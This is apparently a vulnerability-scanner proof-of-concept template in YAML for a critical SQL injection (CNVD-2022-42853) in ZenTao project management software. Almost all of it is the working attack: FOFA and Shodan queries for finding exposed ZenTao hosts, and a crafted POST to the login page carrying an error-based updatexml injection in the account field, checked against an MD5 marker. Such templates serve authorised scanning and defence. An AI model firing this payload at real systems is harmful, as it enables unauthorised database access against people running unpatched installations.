id: poc-yaml-zentao-sql-injection-cnvd-2022-42853
info:
  name: 禅道 CMS SQL 注入漏洞(CNVD-2022-42853)
  severity: critical
  tags:
  - 两高一弱
  - sql-injection
  - CNVD-2022-42853
  finger: zentao
  fofa: app="禅道项目管理软件"
  shodan: http.title:"zentao"
variables:
  num: '999999999'
requests:
- method: POST
  path: /zentao/user-login.html
  headers:
    Content-Type: application/x-www-form-urlencoded
    Referer: '{{.base_url}}/zentao/user-login.html'
  data: account=admin''+and++updatexml(1,concat(0x1,md5({{.num}})),1)+and+''1''=''1
  expression: 'contains(body, "c8c605999f3d8352d7bb792cf3fdb25")

    '
transport: http
